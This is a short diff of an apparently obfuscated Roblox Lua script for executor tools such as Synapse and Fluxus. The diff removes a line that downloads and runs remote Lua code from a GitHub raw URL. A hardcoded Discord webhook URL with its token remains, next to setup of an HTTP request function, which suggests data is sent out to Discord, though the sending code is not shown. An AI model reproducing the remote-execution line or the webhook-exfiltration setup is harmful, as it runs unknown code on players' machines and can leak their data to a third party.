@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Dex-Bear/Ngunhuconcu/refs/heads/main/Notify"))()local _X3N9P5M2L7 = "https://discord.com/api/webhooks/1365966166924853319/taGmnY4QO65UIbAMrShH1Eo3H_MH_WF4jwtADBiKTMlWnXMMrIMM0QxtuUTMgSVHglzn"
+local _X3N9P5M2L7 = "https://discord.com/api/webhooks/1365966166924853319/taGmnY4QO65UIbAMrShH1Eo3H_MH_WF4jwtADBiKTMlWnXMMrIMM0QxtuUTMgSVHglzn"
 local _M8Y1X2N3L5 = game:GetService("HttpService")
 local _Q7X9N6M2L4 = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 
